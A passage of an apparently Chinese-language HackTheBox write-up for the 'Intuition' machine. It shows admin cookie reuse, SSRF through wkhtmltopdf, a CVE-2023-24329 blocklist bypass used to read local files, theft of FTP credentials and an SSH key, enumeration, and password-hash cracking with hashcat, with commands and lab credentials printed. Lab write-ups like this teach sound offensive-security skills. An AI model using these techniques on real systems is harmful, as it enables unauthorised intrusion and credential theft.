+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ==&#x27; | base64 -d</span><br><span class="line">user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5                                                                                                                                                                                           </span><br><span class="line"></span><br><span class="line">$ echo &#x27;eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5&#x27; | base64 -d </span><br><span class="line">&#123;&quot;user_id&quot;: 1, &quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;&#125;|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9   </span><br></pre></td></tr></table></figure>
+
+<p>解密可以看到是管理員的cookie</p>
+<h2 id="0x3-80-admin-cookie-to-LFI"><a href="#0x3-80-admin-cookie-to-LFI" class="headerlink" title="0x3 80 - admin cookie to LFI"></a>0x3 80 - admin cookie to LFI</h2><p>使用這個 cookie去訪問 dashboard：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429042033-kor105v.png" alt="image">​</p>
+<p>上面有四個按鈕，其中 <code>create a backup</code>​ 點了之後，除了 <code>Backup and upload completed successfully!</code>​ 什麽也沒有，不過有一個 <code>Create PDF Report</code>​ 倒是挺吸引我，</p>
+<p>當我填入自己的 python http 服務器的時候：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428035545-vx9xzua.png" alt="image">​</p>
+<p>他會自己幫我轉換PDF，如果用 <code>exiftool</code>​ 查看后，這個是一個有漏洞的 <code>wkhtmltopdf</code>​ 版本：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428035530-dh52ksh.png" alt="image">​</p>
+<h2 id="0xFF-Stuck-in-wkhtmltopdf-0-12-6-exploit"><a href="#0xFF-Stuck-in-wkhtmltopdf-0-12-6-exploit" class="headerlink" title="0xFF Stuck in wkhtmltopdf 0.12.6 exploit"></a>0xFF <del>Stuck in wkhtmltopdf 0.12.6 exploit</del></h2><p>去網上搜索 <code>wkhtmltopdf 0.12.6 exploit</code>​，看到這個版本允許 SSRF，只要你在内容中插入 <code>iframe</code>​ 類似：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.10.1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>這樣的東西你就得到一個請求（至於這個請求有沒有用，那是另一個問題）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat mane.html </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://10.10.16.21/iframe&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1000&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然後填入 ： <code>http://10.10.16.21/mane.html</code>​ 生成PDF，得到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.201.50 - - [29/Apr/2024 04:30:17] &quot;GET /mane.html HTTP/1.1&quot; 200 -</span><br><span class="line">10.129.201.50 - - [29/Apr/2024 04:30:17] code 404, message File not found</span><br><span class="line">10.129.201.50 - - [29/Apr/2024 04:30:17] &quot;GET /iframe HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以嘗試用 iframe 訪問其他端口，類似於<code>http://127.0.0.1:21</code>​ 這樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429043358-xz846pc.png" alt="image">​</p>
+<p>但這樣就會讓你得到一個精美的PDF，如上。</p>
+<h2 id="0x4-80-escape-with-one-space-to-ssh-key"><a href="#0x4-80-escape-with-one-space-to-ssh-key" class="headerlink" title="0x4 80 - escape with one space to ssh key"></a>0x4 80 - escape with one space to ssh key</h2><p>但如果你用nc去接的話：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 80          </span><br><span class="line">listening on [any] 80 ...</span><br><span class="line">connect to [10.10.16.21] from (UNKNOWN) [10.129.201.50] 51460</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 10.10.16.21</span><br><span class="line">User-Agent: Python-urllib/3.11</span><br><span class="line">Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它是 Python-urllib&#x2F;3.11， </p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429161359-3i0hfxb.png" alt="image">​</p>
+<p>可以參考這裏：<a target="_blank" rel="noopener" href="https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d">https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d</a></p>
+<p>這個poc説人話就是在前面加一個空格，然後可以繞過黑名單：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428050015-7wetx7f.png" alt="image">​</p>
+<p>就得到了 LFI：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428050028-mcjlkt9.png" alt="image">​</p>
+<p>既然有LFI的情況下，首先我會看一下當前是什麽進程，運行的參數是什麽：</p>
+<p>​<code>file:///proc/self/cmdline</code>​</p>
+<p>得到 ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051422-aubg7z3.png" alt="image">​</p>
+<p>然後會看一下這個源碼：</p>
+<p>​<code>file:///app/code/app.py</code>​</p>
+<p>得到了一個很亂的東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051527-5o2oqve.png" alt="image">​</p>
+<p>於是手動整理下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051614-7ku99xz.png" alt="image">​</p>
+<p>由於python的特性，如當你 <code>import mane from a.b.c</code>​ ，換句話就是目錄a下的目錄b下的c.py文件裏面有個mane函數，所以可以根據上面的引用去找一些文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:///app/code/blueprints/dashboard/dashboard.py</span><br><span class="line">file:///app/code/blueprints/report/report.py</span><br><span class="line">file:///app/code/blueprints/auth/auth.py</span><br><span class="line">file:///app/code/blueprints/index/index.py</span><br></pre></td></tr></table></figure>
+
+<p>儅查看<code> file:///app/code/blueprints/dashboard/dashboard.py</code>​ 的文件的時候：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051406-j3bu6t6.png" alt="image">​</p>
+<p>看到了ftp的密碼，於是嘗試下ftp協議可以過不：<code> ftp://ftp_admin:u3jai8y71s2@ftp.local</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051736-lstd7xb.png" alt="image">​</p>
+<p>結果可以，看到了裏面有三個文件，最感興趣的就是key文件了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051809-tq1p5n4.png" alt="image">​</p>
+<p>然後用協議去訪問這個文件： <code>ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051918-15e2j9z.png" alt="image">​</p>
+<p>另一個文件：<code>ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt</code>​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428051947-wxcusza.png" alt="image">​</p>
+<p>翻譯成人話就是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">亲爱的开发者，我们很高兴热烈欢迎您与我们一起踏上这段激动人心的旅程。你的</span><br><span class="line">我们的到来标志着我们集体追求卓越的鼓舞人心的篇章的开始，我们真诚地</span><br><span class="line">很高兴您加入。在这里，我们重视人才、创新和团队合作，您的光临再次证明了我们的价值</span><br><span class="line">致力于培养多元化和充满活力的员工队伍。您的技能、经验和独特的观点是</span><br><span class="line">宝贵的资产将为我们的持续增长和成功做出重大贡献。当你适应新环境时</span><br><span class="line">角色，请知道您拥有我们坚定不移的支持。我们的团队随时为您提供指导和帮助，</span><br><span class="line">确保您拥有在您的职位上蓬勃发展所需的资源和知识。为了方便您的工作和</span><br><span class="line">访问我们的系统，我们已在该电子邮件中附加了 SSH 私钥。您可以使用以下密码</span><br><span class="line">访问它，“Y27SH19HDIWD”。使用此密钥时请确保最大程度的保密性和安全性。如果你有任何</span><br><span class="line">对服务器访问或工作的任何其他方面有疑问或需要帮助，请随时与我们联系</span><br><span class="line">寻求帮助。除了您的技术技能之外，我们还鼓励您发挥您的热情、创造力和创新精神</span><br><span class="line">思考到桌子上。您的贡献将在塑造我们项目和产品的未来方面发挥至关重要的作用。一次</span><br><span class="line">再次欢迎来到你的新家庭。我们期待认识您、与您合作、共同见证</span><br><span class="line">您的杰出贡献。我们将共同努力，继续取得伟大的成就。如果您有任何疑问或需要</span><br><span class="line">如需更多信息，请随时通过 adam@comprezzor.htb 与我联系。最好的问候，亚当</span><br></pre></td></tr></table></figure>
+
+<p>但是這個key沒辦法使用，首先是沒有用戶，而且上面的密碼不知道怎麽用，所以懷疑ssh key 裏面有密碼，於是查了一下如何解密ssh key：</p>
+<blockquote>
+<ol>
+<li><p>Open the terminal or command prompt on your computer.</p>
+</li>
+<li><p>Navigate to the directory containing your private SSH key. For instance, the default path for SSH keys on Unix-based systems such as Linux and macOS is <code>~/.ssh</code>​.</p>
+</li>
+<li><p>Run the following command to remove the passphrase, replacing <code>id_rsa</code>​ with the name of your private key file if necessary: “<code> ssh-keygen -p -f id_rsa “</code>​</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://locall.host/how-to-remove-a-passphrase-from-an-ssh-key/">https://locall.host/how-to-remove-a-passphrase-from-an-ssh-key/</a></p>
+</blockquote>
+<p>根據提示嘗試一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 隨便打一個密碼看看有什麽反應</span></span><br><span class="line">$ ssh-keygen -p -f private-8297.key   </span><br><span class="line">Enter old passphrase: </span><br><span class="line">Failed to load key private-8297.key: incorrect passphrase supplied to decrypt private key</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當輸入上面的密碼之後：Y27SH19HDIWD</span></span><br><span class="line">$ ssh-keygen -p -f private-8297.key</span><br><span class="line">Enter old passphrase: </span><br><span class="line">Key has comment <span class="string">&#x27;dev_acc@local&#x27;</span></span><br><span class="line">Enter new passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved with the new passphrase.</span><br></pre></td></tr></table></figure>
+
+<p>看起來成功的解密，然後也告訴你了賬號是 <code>dev_acc</code>​ ，嘗試登陸看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240429050734-w0v0j40.png" alt="image">​</p>
+<p>得到 <code>user.txt</code>​。</p>
+<h2 id="0x5-Information-gathering-before-the-root"><a href="#0x5-Information-gathering-before-the-root" class="headerlink" title="0x5 Information gathering before the root"></a>0x5 Information gathering before the root</h2><p>一上來，老規矩跑一個linpeas看看有什麽感興趣的東西：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 看到有個圖形界面的進程</span></span><br><span class="line">1200        1768  0.0  0.0   9972  3328 ?        Ss   Apr28   0:00  _ bash /opt/bin/entry_point.sh                                                                                       </span><br><span class="line">1200        1840  0.0  0.6  38444 26916 ?        S    Apr28   0:12      _ /usr/bin/python3 /usr/bin/supervisord --configuration /etc/supervisord.conf                                    </span><br><span class="line">1200        1886  0.0  0.0   9972  3584 ?        S    Apr28   0:00          _ bash /opt/bin/start-xvfb.sh                                                                                </span><br><span class="line">1200        1889  0.0  0.0   2892  1792 ?        S    Apr28   0:00          |   _ /bin/sh /usr/bin/xvfb-run --server-num=99 --listen-tcp --server-args=-screen 0 1360x1020x24 -fbdir /var/tmp</span><br><span class="line"> -dpi 96 -listen tcp -noreset -ac +extension RANDR /usr/bin/fluxbox -display :99.0                                                                                                       </span><br><span class="line">1200        1921  0.1  2.3 238528 92020 ?        S    Apr28   0:53          |       _ Xvfb :99 -screen 0 1360x1020x24 -fbdir /var/tmp -dpi 96 -listen tcp -noreset -ac +extension RANDR -auth</span><br><span class="line"> /tmp/xvfb-run.UiHPZW/Xauthority                                                                                                                                                         </span><br><span class="line">1200        1972  0.0  0.3  23648 12300 ?        S    Apr28   0:11          |       _ /usr/bin/fluxbox -display :99.0                                                                    </span><br><span class="line">1200        1888  0.0  0.0   9972  3584 ?        S    Apr28   0:00          _ bash /opt/bin/start-vnc.sh                                                                                 </span><br><span class="line">1200        2040  0.1  0.4  41320 15928 ?        S    Apr28   0:52          |   _ x11vnc -usepw -forever -shared -rfbport 5900 -rfbportv6 5900 -display :99.0                            </span><br><span class="line">1200        1890  0.0  0.0   9972  3584 ?        S    Apr28   0:00          _ bash /opt/bin/start-novnc.sh                                                                               </span><br><span class="line">1200        1894  0.0  0.0  10104  3712 ?        S    Apr28   0:00          |   _ bash /opt/bin/noVNC/utils/novnc_proxy --listen 7900 --vnc localhost:5900                               </span><br><span class="line">1200        1923  0.0  0.5  32480 19924 ?        S    Apr28   0:05          |       _ python3 -m websockify --web /opt/bin/noVNC 7900 localhost:5900                                     </span><br><span class="line">1200        1895  0.0  0.0   9972  3072 ?        S    Apr28   0:00          _ bash -c /opt/bin/start-selenium-standalone.sh; EXIT_CODE=$?; <span class="built_in">kill</span> -s SIGINT `<span class="built_in">cat</span> /var/run/supervisor/supervisor</span><br><span class="line">d.pid`; <span class="built_in">exit</span> <span class="variable">$EXIT_CODE</span>                                                                                                                                            </span><br><span class="line"></span><br><span class="line"><span class="comment"># 有一些奇怪的端口</span></span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 127.0.0.1:41169         0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -                </span><br><span class="line">tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      -                </span><br><span class="line"></span><br><span class="line"><span class="comment"># 用戶</span></span><br><span class="line">adam:x:1002:1002:,,,:/home/adam:/bin/bash</span><br><span class="line">dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash</span><br><span class="line">lopez:x:1003:1003:,,,:/home/lopez:/bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x6-Ftp-to-unknown-password"><a href="#0x6-Ftp-to-unknown-password" class="headerlink" title="0x6 Ftp to unknown password"></a>0x6 Ftp to unknown password</h2><p>然後跑了下 pspy 看看有沒有什麽感興趣的：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062632-4s482ui.png" alt="image">​<br>看到它會自動清理數據庫，一般中等的機器以上，數據庫裏面都會有髒東西，所以扒下來看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062645-qn42car.png" alt="image">​</p>
+<p>你也可以用命令行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:~$ sqlite3 /var/www/app/blueprints/auth/users.db </span><br><span class="line">SQLite version 3.37.2 2022-01-06 13:25:41</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line">sqlite&gt; SELECT * FROM <span class="built_in">users</span>;</span><br><span class="line">1|admin|sha256$nypGJ02XBnkIQK71<span class="variable">$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606</span>|admin</span><br><span class="line">2|adam|sha256$Z7bcBO9P43gvdQWp<span class="variable">$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43</span>|webdev</span><br><span class="line">sqlite&gt; </span><br></pre></td></tr></table></figure>
+
+<p>可以看到裏面有另一個用戶，然後使用這個hash去hashcat爆破下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428062653-ove9ndf.png" alt="image">​</p>
+<p>得到密碼 <code>adam gray</code>​，嘗試了下，ssh無法登錄，所以嘗試ftp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dev_acc@intuition:/var/www/app$ ftp  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Connected to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.</span><br><span class="line"><span class="number">220</span> pyftpdlib <span class="number">1.5</span><span class="number">.7</span> ready.</span><br><span class="line">Name (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:dev_acc): adam </span><br><span class="line"><span class="number">331</span> Username ok, send password.</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span> Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> <span class="keyword">is</span> UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"></span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line"><span class="number">229</span> Entering extended passive mode (|||<span class="number">50203</span>|).</span><br><span class="line"><span class="number">125</span> Data connection already <span class="built_in">open</span>. Transfer starting.</span><br><span class="line">drwxr-xr-x   <span class="number">3</span> root     <span class="number">1002</span>         <span class="number">4096</span> Apr <span class="number">10</span> 08:<span class="number">21</span> backup</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"></span><br><span class="line">ftp&gt; cd backup</span><br><span class="line"><span class="number">250</span> <span class="string">&quot;/backup&quot;</span> <span class="keyword">is</span> the current directory.</span><br><span class="line"></span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line"><span class="number">229</span> Entering extended passive mode (|||<span class="number">58001</span>|).</span><br><span class="line"><span class="number">125</span> Data connection already <span class="built_in">open</span>. Transfer starting.</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root     <span class="number">1002</span>         <span class="number">4096</span> Apr <span class="number">10</span> 08:<span class="number">21</span> runner1</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"></span><br><span class="line">ftp&gt; cd runner1</span><br><span class="line"><span class="number">250</span> <span class="string">&quot;/backup/runner1&quot;</span> <span class="keyword">is</span> the current directory.</span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">229</span> Entering extended passive mode (|||<span class="number">43291</span>|).</span><br><span class="line"><span class="number">150</span> File status okay. About to <span class="built_in">open</span> data connection.</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> root     <span class="number">1002</span>          <span class="number">318</span> Apr 06 <span class="number">00</span>:<span class="number">25</span> run-tests.sh</span><br><span class="line">-rwxr-xr-x   <span class="number">1</span> root     <span class="number">1002</span>        <span class="number">16744</span> Oct <span class="number">19</span>  <span class="number">2023</span> runner1</span><br><span class="line">-rw-r--r--   <span class="number">1</span> root     <span class="number">1002</span>         <span class="number">3815</span> Oct <span class="number">19</span>  <span class="number">2023</span> runner1.c</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>/backup/runner1</code>​ 裏面有三個文件，都下載下來看看：</p>
+<p>​<code>runner1.c</code>​ 的開頭有一個hash</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define INVENTORY_FILE &quot;/opt/playbooks/inventory.ini&quot;</span></span><br><span class="line"><span class="comment">#define PLAYBOOK_LOCATION &quot;/opt/playbooks/&quot;</span></span><br><span class="line"><span class="comment">#define ANSIBLE_PLAYBOOK_BIN &quot;/usr/bin/ansible-playbook&quot;</span></span><br><span class="line"><span class="comment">#define ANSIBLE_GALAXY_BIN &quot;/usr/bin/ansible-galaxy&quot;</span></span><br><span class="line"><span class="comment">#define AUTH_KEY_HASH &quot;0feda17076d793c2ef2870d7427ad4ed&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<code>run-tests.sh</code>​ 的脚本給了一部分的密碼</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./runner1 run 1 -a &quot;UHI75GHI****&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了一下源代碼，是使用md5加密，所以猜測：<code>md5(UHI75GHI****) == 0feda17076d793c2ef2870d7427ad4ed</code>​，</p>
+<p>所以使用 hashcat 的mask attack：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">3</span> -m <span class="number">0</span> 0feda17076d793c2ef2870d7427ad4ed UHI75GHI?u?u?u?u</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-UYmazYK7HSCjQ5Ed-Intuition/image-20240428065604-qte4glq.png" alt="image">​</p>
+<p>得到密碼：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP</span><br></pre></td></tr></table></figure>
+
+<p>但是這個密碼似乎沒什麽用。</p>
+<h2 id="0x7-Finding-lopez-password"><a href="#0x7-Finding-lopez-password" class="headerlink" title="0x7 Finding lopez password"></a>0x7 Finding lopez password</h2><p>在前面的信息枚舉中，還發現了其他的用戶，這暗示著需要跳到某一個用戶上，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -ri <span class="string">&quot;lopez&quot;</span> /usr 2&gt;/dev/null</span><br><span class="line">grep -ri <span class="string">&quot;lopez&quot;</span> /home 2&gt;/dev/null</span><br><span class="line">grep -ri <span class="string">&quot;lopez&quot;</span> /opt 2&gt;/dev/null</span><br><span class="line">grep -ri <span class="string">&quot;lopez&quot;</span> /var 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>額，結果什麽都沒有，然後去一下日志搜索一下gz文件：</p>
+<p>zgrep 可以參考這篇：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1253816/find-string-inside-a-gzipped-file-in-a-folder">https://stackoverflow.com/questions/1253816/find-string-inside-a-gzipped-file-in-a-folder</a></p>
